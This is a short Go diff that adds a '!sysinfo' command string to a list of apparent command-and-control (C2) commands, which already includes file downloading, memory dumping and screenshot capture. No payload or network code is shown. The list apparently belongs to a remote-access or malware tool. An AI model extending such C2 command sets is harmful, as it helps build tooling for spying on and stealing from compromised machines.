@@ -21,4 +21,5 @@ const (
 	C2CmdFileDownloader = "!file_downloader"
 	C2CmdMemDump        = "!mem_dump"
 	C2CmdScreenshot     = "!screenshot"
+	C2CmdSysInfo        = "!sysinfo"
 )
